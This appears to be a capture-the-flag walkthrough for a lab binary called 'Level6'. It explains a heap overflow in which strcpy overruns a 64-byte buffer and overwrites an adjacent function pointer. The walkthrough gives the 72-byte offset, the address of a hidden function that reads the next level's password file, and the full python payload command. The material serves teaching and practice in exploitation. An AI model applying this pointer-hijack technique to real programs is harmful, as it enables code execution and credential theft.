================================== Level6 Walkthrough ============================================

Vulnerability

The program allocates two adjacent heap chunks:

buf = malloc(64);
fp  = malloc(4);

Then initializes the function pointer:

*fp = m;

and copies user input into the heap buffer using:

strcpy(buf, argv[1]);

The problem is that strcpy() performs no bounds checking.

This creates a heap overflow vulnerability.

Important Memory Layout

Conceptually the heap looks like this:

=============================================
[8 bytes metadata][64-byte buffer]
[8 bytes metadata][4-byte function pointer]
=============================================

The first metadata chunk is irrelevant because writing starts directly inside the buffer.

The important part is:

buffer → next chunk metadata → function pointer

So if we write more than 64 bytes, we continue into:

heap metadata
then into the function pointer allocation
Why 72 Bytes?

To reach the function pointer:

64 bytes buffer
+ 8 bytes heap metadata
= 72 bytes

After 72 bytes, we fully control the function pointer stored in heap memory.

Function Pointer Hijack

Normally:

fp → m()

and later the program executes:

(*fp)();

which becomes:

m();

resulting in:

Nope
Hidden Function

Using:

info functions

reveals another function:

0x08048454  n

Disassembling it shows:

system("/bin/cat /home/user/level7/.pass");

So the goal is simply:

replace m() address with n() address
Exploit

Address of n():

0x08048454

Little-endian:

\x54\x84\x04\x08

Final payload:

./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
What Happens in Memory

Before overflow:

[fp] = 0x08048468 → m()

After overflow:

[fp] = 0x08048454 → n()

Then:

(*fp)();

calls n() instead of m().